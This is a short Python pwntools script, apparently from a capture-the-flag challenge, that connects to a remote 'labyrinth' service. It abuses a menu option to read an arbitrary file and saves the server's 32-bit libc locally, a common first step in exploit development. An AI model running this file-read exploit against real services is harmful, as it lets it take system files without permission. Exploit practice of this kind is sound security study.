from pwn import *


def dump_file(filename):
    p.recvuntil('4. exit\n> ')
    p.sendline('3')
    p.recvuntil('KEY>')
    p.sendline(filename)

p = remote('labyrinth.eatpwnnosleep.com', 10000)
dump_file('/lib32/libc-2.23.so')

data = p.recvuntil('1. make_labyrinth', drop=True)

with open('SCTF_x86.so', 'wb') as f:
    f.write(data)
